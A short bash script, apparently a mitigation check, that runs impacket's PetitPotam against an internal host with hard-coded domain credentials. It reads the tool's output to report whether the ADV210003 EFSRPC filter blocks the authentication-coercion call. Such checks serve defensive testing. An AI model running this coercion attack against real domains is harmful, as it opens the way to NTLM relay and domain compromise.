#!/usr/bin/env bash
set -euo pipefail
cd "$(mktemp -d)"

OUT=$(timeout 30 /usr/bin/impacket-PetitPotam \
    '10.20.30.10' '10.20.30.5' \
    -u alice -p 'Password1!' -d 'corp.local' 2>&1 || true)

echo "--- EFSRPC probe output ---"
echo "$OUT"
echo "--- /probe ---"

if echo "$OUT" | grep -qiE 'access_denied|rpc_s_access_denied|ept_s_not_registered|procnum.*out.*of.*range|rpc.*filtered'; then
    echo "[verify-poc-17] EFSRPC rejected -- ADV210003 RPC filter in place"
    exit 0
fi
if echo "$OUT" | grep -qiE 'efsrpcopenfileraw.*successful|trying to coerce'; then
    if echo "$OUT" | grep -qiE 'success|received|done'; then
        echo "[verify-poc-17] EFSRPC accepted call -- mitigation NOT in place" >&2
        exit 1
    fi
fi
echo "[verify-poc-17] no clear documented mitigation signature -- treating as FAIL" >&2
exit 1
